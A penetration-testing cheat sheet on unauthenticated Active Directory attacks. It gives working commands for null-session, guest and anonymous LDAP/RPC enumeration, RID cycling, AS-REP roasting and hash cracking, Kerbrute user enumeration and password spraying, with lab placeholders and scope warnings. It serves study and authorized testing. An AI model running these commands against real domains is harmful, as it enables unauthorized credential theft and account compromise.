# Unauthenticated AD Attacks

Unauthenticated AD attacks are checks and techniques that can be performed before obtaining valid domain credentials.

The goal is to identify weak exposure, anonymous access, guest access, Kerberos username behavior, AS-REP roastable users, and safe initial credential opportunities.

**Useful resources:**

- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [HackTricks - rpcclient Enumeration](https://hacktricks.wiki/en/network-services-pentesting/pentesting-smb/rpcclient-enumeration.html)
- [NetExec - Enumerate Null Sessions](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-null-sessions)
- [NetExec - Enumerate Guest Logon](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon)
- [The Hacker Recipes - ASREP Roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Impacket](https://github.com/fortra/impacket)
- [WADComs](https://wadcoms.github.io/)

---

## Null Sessions

A null session is an SMB/RPC connection attempted without a username and without a password.

It is often written as:

```text
username: empty
password: empty
```

In Windows context, this usually maps to anonymous-style access rather than a real user account.

Null sessions are interesting because they may allow limited enumeration of:

- domain name
- hostname
- shares
- users
- groups
- password policy
- domain SID
- RPC information
- accessible files

Basic variables:

```bash
export TARGET=10.10.10.10
export RANGE=10.10.10.0/24
export DOMAIN=corp.local
export DC_IP=10.10.10.10
```

Null session with NetExec:

```bash
nxc smb $TARGET -u '' -p ''
```

Against a range:

```bash
nxc smb $RANGE -u '' -p ''
```

Check shares:

```bash
nxc smb $TARGET -u '' -p '' --shares
```

Check users:

```bash
nxc smb $TARGET -u '' -p '' --users
```

Check groups:

```bash
nxc smb $TARGET -u '' -p '' --groups
```

Check password policy:

```bash
nxc smb $TARGET -u '' -p '' --pass-pol
```

RID brute through null session:

```bash
nxc smb $TARGET -u '' -p '' --rid-brute
```

Null session with `smbclient`:

```bash
smbclient -L //$TARGET/ -N
```

Connect to a readable share:

```bash
smbclient //$TARGET/SHARENAME -N
```

Recursive listing:

```bash
smbclient //$TARGET/SHARENAME -N -c 'recurse ON; ls'
```

Download files in a lab when allowed:

```bash
smbclient //$TARGET/SHARENAME -N -c 'recurse ON; prompt OFF; mget *'
```

Null session with `smbmap`:

```bash
smbmap -H $TARGET -u '' -p ''
```

Null session with `rpcclient`:

```bash
rpcclient -U "" -N $TARGET
```

Useful `rpcclient` checks:

```text
srvinfo
querydominfo
enumdomusers
enumdomgroups
enumalsgroups builtin
lsaquery
getdompwinfo
```

One-liners:

```bash
rpcclient -U "" -N $TARGET -c "srvinfo"
rpcclient -U "" -N $TARGET -c "querydominfo"
rpcclient -U "" -N $TARGET -c "enumdomusers"
rpcclient -U "" -N $TARGET -c "enumdomgroups"
rpcclient -U "" -N $TARGET -c "lsaquery"
rpcclient -U "" -N $TARGET -c "getdompwinfo"
```

`enum4linux-ng`:

```bash
enum4linux-ng -A $TARGET
enum4linux-ng -A -u '' -p '' $TARGET
```

Useful findings:

| Finding | Why it matters |
| --- | --- |
| Domain name | Needed for Kerberos, LDAP, and username validation. |
| NetBIOS name | Useful with SMB/RPC tools. |
| Domain SID | Useful for RID cycling and SID interpretation. |
| Users | Input for Kerberos enumeration or password spraying. |
| Groups | Helps understand basic privilege structure. |
| Shares | May expose scripts, configs, or readable files. |
| Password policy | Needed before any password-based testing. |
| SMB signing | Important context for relay testing later. |


Common outcomes:

| Result | Meaning |
| --- | --- |
| Login failed | Null session probably not accepted. |
| Login accepted but no shares | Anonymous access exists but has little usable access. |
| Shares readable | Check files carefully. |
| Users/groups exposed | Build a username list. |
| Password policy exposed | Save before any spraying. |

---

## SMB Guest Access

SMB guest access is different from a null session.

A null session sends no username and no password. Guest access uses guest-style authentication or may map a failed login to the Guest account depending on configuration.

Guest access is interesting because it may expose:

- readable shares
- anonymous-looking file access
- user directories
- internal documentation
- scripts
- configuration files
- password policy
- domain or hostname information

Check guest login with NetExec:

```bash
nxc smb $TARGET -u guest -p ''
```

Some systems accept random credentials and map them to Guest:

```bash
nxc smb $TARGET -u randomuser -p randompass
```

Check guest access against a range:

```bash
nxc smb $RANGE -u guest -p ''
```

List shares:

```bash
nxc smb $TARGET -u guest -p '' --shares
```

Check password policy:

```bash
nxc smb $TARGET -u guest -p '' --pass-pol
```

Enumerate users if allowed:

```bash
nxc smb $TARGET -u guest -p '' --users
```

Enumerate groups if allowed:

```bash
nxc smb $TARGET -u guest -p '' --groups
```

Check RID brute:

```bash
nxc smb $TARGET -u guest -p '' --rid-brute
```

`smbclient` guest check:

```bash
smbclient -L //$TARGET/ -U 'guest%'
```

Connect to share:

```bash
smbclient //$TARGET/SHARENAME -U 'guest%'
```

`smbmap` guest check:

```bash
smbmap -H $TARGET -u guest -p ''
```

Recursive share listing:

```bash
smbmap -H $TARGET -u guest -p '' -R
```

Download allowed share contents in a lab:

```bash
smbmap -H $TARGET -u guest -p '' --download 'SHARE\\path\\file.txt'
```

Interesting shares:

| Share | Notes |
| --- | --- |
| `SYSVOL` | Domain policies and scripts on DCs. |
| `NETLOGON` | Logon scripts on DCs. |
| `Users` | User folders, profile data, naming patterns. |
| `Shared` | Generic shared files. |
| `IT` | Scripts, tools, configs. |
| `Backups` | Backup archives, database dumps, exported configs. |
| `Software` | Installers and deployment scripts. |
| `HR` | Names and possible username sources. |

Interesting file names:

```text
passwords.txt
creds.txt
accounts.csv
users.csv
config.xml
web.config
appsettings.json
database.ini
backup.zip
backup.7z
*.kdbx
*.ps1
*.bat
*.cmd
*.vbs
*.rdp
```

Search after downloading files:

```bash
grep -RniE "pass|password|pwd|cred|secret|token|key|login|user" .
find . -iname "*.kdbx" -o -iname "*.config" -o -iname "*.xml" -o -iname "*.ps1" -o -iname "*.bat" -o -iname "*.txt"
```

Null vs Guest:

| Access type | Username | Password | Notes |
| --- | --- | --- | --- |
| Null session | empty | empty | Anonymous-style SMB/RPC session. |
| Guest | `guest` or random | empty or random | May map to local/domain Guest. |

Useful findings:

| Finding | Why it matters |
| --- | --- |
| Guest login accepted | Weak unauthenticated exposure. |
| Guest has readable shares | Possible initial information source. |
| Guest can read SYSVOL/NETLOGON | Check scripts and policy files. |
| Guest can list users | Build username list. |
| Guest sees password policy | Supports safe spray planning. |
| Random credentials accepted | Target may map failures to guest. |



---

## Anonymous LDAP

Anonymous LDAP means LDAP allows a bind without valid credentials.

Many modern AD environments expose RootDSE anonymously but do not allow full anonymous directory enumeration.

RootDSE access alone is normal and still useful because it can reveal domain naming context and DC information.

Check LDAP RootDSE:

```bash
ldapsearch -x -H ldap://$DC_IP -s base
```

More detailed RootDSE:

```bash
ldapsearch -x -H ldap://$DC_IP -s base +
```

Specific useful fields:

```bash
ldapsearch -x -H ldap://$DC_IP -s base defaultNamingContext rootDomainNamingContext configurationNamingContext schemaNamingContext dnsHostName ldapServiceName
```

Useful fields:

| Field | Meaning |
| --- | --- |
| `defaultNamingContext` | Main domain base DN. |
| `rootDomainNamingContext` | Forest root domain DN. |
| `configurationNamingContext` | Configuration partition. |
| `schemaNamingContext` | Schema partition. |
| `dnsHostName` | DC hostname. |
| `ldapServiceName` | Domain and service details. |
| `supportedSASLMechanisms` | Supported authentication mechanisms. |
| `supportedLDAPVersion` | LDAP versions. |

Convert DN to domain:

```text
DC=corp,DC=local -> corp.local
DC=ad,DC=company,DC=com -> ad.company.com
```

Check if anonymous bind can read domain objects:

```bash
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(objectClass=*)"
```

Enumerate users if allowed:

```bash
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName userPrincipalName description
```

Enumerate computers if allowed:

```bash
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(objectClass=computer)" dNSHostName operatingSystem servicePrincipalName
```

Enumerate groups if allowed:

```bash
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(objectClass=group)" cn member
```

Find users with SPNs if anonymous LDAP allows it:

```bash
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

Find users without Kerberos pre-authentication if anonymous LDAP allows it:

```bash
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName userPrincipalName
```

Find password policy objects if readable:

```bash
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(objectClass=domainDNS)" minPwdLength lockoutThreshold lockoutDuration lockOutObservationWindow maxPwdAge
```

LDAPS anonymous RootDSE:

```bash
ldapsearch -x -H ldaps://$DC_IP -s base +
```

NetExec LDAP anonymous checks:

```bash
nxc ldap $DC_IP -u '' -p ''
nxc ldap $DC_IP -u '' -p '' --users
nxc ldap $DC_IP -u '' -p '' --groups
```

Useful LDAP filters:

| Goal | Filter |
| --- | --- |
| Users | `(&(objectCategory=person)(objectClass=user))` |
| Computers | `(objectClass=computer)` |
| Groups | `(objectClass=group)` |
| Users with SPNs | `(&(objectClass=user)(servicePrincipalName=*))` |
| No pre-auth required | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` |
| Disabled accounts | `(userAccountControl:1.2.840.113556.1.4.803:=2)` |
| Password never expires | `(userAccountControl:1.2.840.113556.1.4.803:=65536)` |

Useful findings:

| Finding | Why it matters |
| --- | --- |
| Base DN | Required for LDAP queries. |
| Domain DNS name | Needed for Kerberos and DNS checks. |
| DC hostname | Useful for `/etc/hosts`. |
| Anonymous object read | Strong unauthenticated information exposure. |
| Users | Username list source. |
| Computers | Host inventory. |
| SPNs | Service account context. |
| No pre-auth users | ASREP roasting candidates. |
| Password policy | Needed before password spraying. |



---

## RPC Anonymous Enum

RPC anonymous enumeration uses SMB named pipes and RPC interfaces to retrieve domain or host information without credentials.

It often overlaps with null sessions because `rpcclient` may connect over SMB.

Start with anonymous `rpcclient`:

```bash
rpcclient -U "" -N $TARGET
```

Useful commands:

```text
srvinfo
querydominfo
lsaquery
enumdomusers
enumdomgroups
enumalsgroups builtin
getdompwinfo
```

One-liners:

```bash
rpcclient -U "" -N $TARGET -c "srvinfo"
rpcclient -U "" -N $TARGET -c "querydominfo"
rpcclient -U "" -N $TARGET -c "lsaquery"
rpcclient -U "" -N $TARGET -c "enumdomusers"
rpcclient -U "" -N $TARGET -c "enumdomgroups"
rpcclient -U "" -N $TARGET -c "enumalsgroups builtin"
rpcclient -U "" -N $TARGET -c "getdompwinfo"
```

Get domain SID:

```bash
rpcclient -U "" -N $TARGET -c "lsaquery"
```

Example domain SID format:

```text
S-1-5-21-1111111111-2222222222-3333333333
```

RID cycling manually:

```bash
export DOMAIN_SID='S-1-5-21-1111111111-2222222222-3333333333'

for rid in $(seq 500 2000); do
  rpcclient -U "" -N $TARGET -c "lookupsids $DOMAIN_SID-$rid" 2>/dev/null | grep -v "unknown"
done
```

RID cycling with NetExec:

```bash
nxc smb $TARGET -u '' -p '' --rid-brute
```

RID cycling with Impacket:

```bash
lookupsid.py anonymous@$TARGET -no-pass
```

RID ranges worth recognizing:

| RID | Meaning |
| --- | --- |
| `500` | Built-in Administrator. |
| `501` | Guest. |
| `512` | Domain Admins. |
| `513` | Domain Users. |
| `514` | Domain Guests. |
| `515` | Domain Computers. |
| `516` | Domain Controllers. |
| `519` | Enterprise Admins. |
| `1000+` | Common range for created users and groups. |

Query specific user by RID after enumeration:

```bash
rpcclient -U "" -N $TARGET -c "queryuser 1105"
```

Query group:

```bash
rpcclient -U "" -N $TARGET -c "querygroup 512"
```

Query group members:

```bash
rpcclient -U "" -N $TARGET -c "querygroupmem 512"
```

Password policy through RPC:

```bash
rpcclient -U "" -N $TARGET -c "getdompwinfo"
```

Combined enum with `enum4linux-ng`:

```bash
enum4linux-ng -A -u '' -p '' $TARGET
```

Useful findings:

| Finding | Why it matters |
| --- | --- |
| Domain SID | Allows RID cycling and SID interpretation. |
| Usernames | Input for Kerberos enumeration and later spraying. |
| Groups | Shows basic privilege structure. |
| Password policy | Critical before password spraying. |
| Server info | OS and role context. |
| Builtin aliases | Useful for understanding local/domain privileges. |


---

## ASREP Roasting

ASREP roasting targets accounts that do not require Kerberos pre-authentication.

Normally, Kerberos pre-authentication requires the client to prove knowledge of the password before receiving an AS-REP response. If pre-authentication is disabled for an account, the KDC can return AS-REP material that can be cracked offline.

This does not require valid domain credentials if a username list is available.

Requirements:

| Requirement | Notes |
| --- | --- |
| Domain name | Example: `corp.local`. |
| DC IP | KDC target. |
| Username list | Confirmed or guessed users. |
| Kerberos port | TCP/UDP `88` reachable. |
| Account with pre-auth disabled | Target condition. |

Check with Impacket `GetNPUsers.py`:

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass
```

Example with explicit values:

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass
```

Save output:

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -outputfile asrep_hashes.txt
```

If valid credentials are available later, LDAP-based discovery can be used, but this section focuses on unauthenticated checks.

Expected result when vulnerable:

```text
$krb5asrep$23$user@DOMAIN:...
```

Hashcat mode:

| Hash type | Mode |
| --- | --- |
| Kerberos 5 AS-REP etype 23 | `18200` |

Crack with Hashcat:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Show cracked values:

```bash
hashcat -m 18200 asrep_hashes.txt --show
```

Crack with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

Show John results:

```bash
john --show asrep_hashes.txt
```

Kerbrute can show users that may not require pre-auth depending on response behavior, but `GetNPUsers.py` is the common direct tool for AS-REP collection.

Useful username preparation:

```bash
cat users.txt | tr '[:upper:]' '[:lower:]' | sort -u > users_clean.txt
```

ASREP result interpretation:

| Result | Meaning |
| --- | --- |
| AS-REP hash returned | Account likely does not require pre-auth. |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User likely does not exist. |
| `KDC_ERR_PREAUTH_REQUIRED` | User exists but pre-auth is required. |
| No useful output | No vulnerable user found or input/domain issue. |

Useful notes:

| Note | Why it matters |
| --- | --- |
| ASREP is offline cracking | After hash collection, cracking does not hit the DC. |
| Usernames are required | Without users, you need enumeration or guessed names. |
| Kerberos realm matters | Wrong domain/realm can break results. |
| Time can matter | Kerberos errors may be caused by clock skew. |
| Cracked password should be validated carefully | Avoid unnecessary lockout risk. |

---

## Password Spraying

Password spraying tests one or a few passwords against many users.

It is different from brute force.

Brute force usually tries many passwords against one account. Password spraying tries one password against many accounts to reduce lockout risk.

Password spraying should only be done when explicitly allowed and after checking the password policy.

Before spraying, identify:

| Item | Why it matters |
| --- | --- |
| Lockout threshold | Number of bad attempts before lockout. |
| Lockout window | Time window for counting bad attempts. |
| Lockout duration | How long lockout lasts. |
| Fine-grained password policies | Some users may have different rules. |
| Valid users | Reduces unnecessary attempts. |
| Scope | Which accounts and systems are allowed. |
| Timing | Avoid business impact in real assessments. |

Try to get password policy without credentials:

```bash
nxc smb $DC_IP -u '' -p '' --pass-pol
rpcclient -U "" -N $DC_IP -c "getdompwinfo"
```

If guest works:

```bash
nxc smb $DC_IP -u guest -p '' --pass-pol
```

Common password policy fields:

| Field | Meaning |
| --- | --- |
| Minimum password length | Minimum allowed length. |
| Password history | Prevents password reuse. |
| Maximum password age | Password expiry behavior. |
| Lockout threshold | Failed attempts before lockout. |
| Lockout duration | How long the lockout lasts. |
| Lockout observation window | Time window for counting failures. |

Username list format:

```text
alice
bob
charlie
svc_sql
```

Clean user list:

```bash
cat users.txt | tr '[:upper:]' '[:lower:]' | sort -u > users_clean.txt
```

Basic SMB spray with NetExec:

```bash
nxc smb $DC_IP -u users_clean.txt -p 'Password123!' --continue-on-success
```

Spray against a host list:

```bash
nxc smb targets.txt -u users_clean.txt -p 'Password123!' --continue-on-success
```

LDAP spray:

```bash
nxc ldap $DC_IP -u users_clean.txt -p 'Password123!' --continue-on-success
```

Kerberos spray with Kerbrute:

```bash
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users_clean.txt 'Password123!'
```

Spray with a single password and save output:

```bash
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users_clean.txt 'Password123!' -o spray_password123.txt
```

Spray with username as password pattern using NetExec:

```bash
nxc smb $DC_IP -u users_clean.txt -p users_clean.txt --no-bruteforce --continue-on-success
```

This tests:

```text
alice:alice
bob:bob
charlie:charlie
```

Useful candidate password sources in labs:

| Source | Examples |
| --- | --- |
| Company name | `Corp2024!`, `Company2025!` |
| Season + year | `Summer2025!`, `Winter2026!` |
| Default patterns | `Password123!`, `Welcome1!` |
| Internal files | Passwords found in shares or docs. |
| Naming convention | Product, project, or site names. |
| Known breached lab hints | HTB/THM context, room notes. |

Spray result interpretation:

| Result | Meaning |
| --- | --- |
| Successful login | Valid credential pair. |
| `STATUS_LOGON_FAILURE` | Wrong password. |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account locked. Stop and reassess. |
| `STATUS_PASSWORD_MUST_CHANGE` | Valid password but password change required. |
| `STATUS_ACCOUNT_DISABLED` | Account disabled. |
| `STATUS_LOGON_TYPE_NOT_GRANTED` | Credentials valid but logon type not allowed. |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password in Kerberos context. |
| `KDC_ERR_CLIENT_REVOKED` | Account disabled, locked, or restricted. |

Avoid spraying:

- without scope approval
- without knowing lockout policy
- with many passwords quickly
- against privileged accounts unless explicitly allowed
- against production users without agreed timing
- with noisy or unclean userlists
- after lockout signs appear

Safe lab-style spray pacing:

```text
1 password
many users
wait according to policy
next password only if allowed
```

---

## Initial Foothold Checklist

Use this checklist when starting an unauthenticated AD target.

**1. Basic target context**

```text
Target IP:
Hostname:
Domain DNS name:
NetBIOS name:
Kerberos realm:
DC IP:
DC hostname:
```

**2. Network and service checks**

```bash
nmap -Pn -n --open -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985,5986,9389 $TARGET
nxc smb $TARGET
```

Record:

```text
DNS open:
Kerberos open:
LDAP open:
SMB open:
RPC open:
Global Catalog open:
WinRM open:
RDP open:
```

**3. Null session**

```bash
nxc smb $TARGET -u '' -p ''
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u '' -p '' --users
nxc smb $TARGET -u '' -p '' --groups
nxc smb $TARGET -u '' -p '' --pass-pol
```

Record:

```text
Null session accepted:
Shares readable:
Users exposed:
Groups exposed:
Password policy exposed:
```

**4. Guest access**

```bash
nxc smb $TARGET -u guest -p ''
nxc smb $TARGET -u guest -p '' --shares
smbclient -L //$TARGET/ -U 'guest%'
```

Record:

```text
Guest accepted:
Random creds mapped to guest:
Readable shares:
Writable shares:
Interesting files:
```

**5. Anonymous LDAP**

```bash
ldapsearch -x -H ldap://$DC_IP -s base +
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(objectClass=*)"
```

Record:

```text
RootDSE readable:
Base DN:
Anonymous domain object read:
Users readable:
Computers readable:
Groups readable:
SPNs readable:
No-preauth users readable:
```

**6. Anonymous RPC**

```bash
rpcclient -U "" -N $TARGET -c "srvinfo"
rpcclient -U "" -N $TARGET -c "querydominfo"
rpcclient -U "" -N $TARGET -c "lsaquery"
rpcclient -U "" -N $TARGET -c "enumdomusers"
rpcclient -U "" -N $TARGET -c "enumdomgroups"
rpcclient -U "" -N $TARGET -c "getdompwinfo"
```

Record:

```text
Anonymous RPC accepted:
Domain SID:
Users:
Groups:
Password policy:
RID brute possible:
```

**7. Kerberos username enumeration**

```bash
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt -o kerbrute_users.txt
```

Record:

```text
Userlist source:
Valid users:
Invalid pattern:
KDC errors:
```

**8. ASREP roasting**

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -outputfile asrep_hashes.txt
```

If hashes are found:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Record:

```text
ASREP hashes:
Cracked users:
Cracked passwords:
```

**9. Password policy before spraying**

```bash
nxc smb $DC_IP -u '' -p '' --pass-pol
rpcclient -U "" -N $DC_IP -c "getdompwinfo"
```

Record:

```text
Lockout threshold:
Lockout duration:
Observation window:
Minimum password length:
```

**10. Password spraying**

```bash
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users_clean.txt 'Password123!'
nxc smb $DC_IP -u users_clean.txt -p 'Password123!' --continue-on-success
```

Record:

```text
Password tried:
Valid credentials:
Disabled accounts:
Locked accounts:
Errors:
```

**11. First foothold decision**

Possible first foothold sources:

| Source | Result |
| --- | --- |
| ASREP cracked password | Try normal authentication carefully. |
| Password spray success | Validate allowed services. |
| Guest-readable share | Search files for secrets. |
| Null-readable share | Search files for secrets. |
| Anonymous LDAP user list | Use for Kerberos enum or ASREP. |
| RPC RID brute users | Build userlist. |
| SYSVOL/NETLOGON files | Check scripts and configuration. |

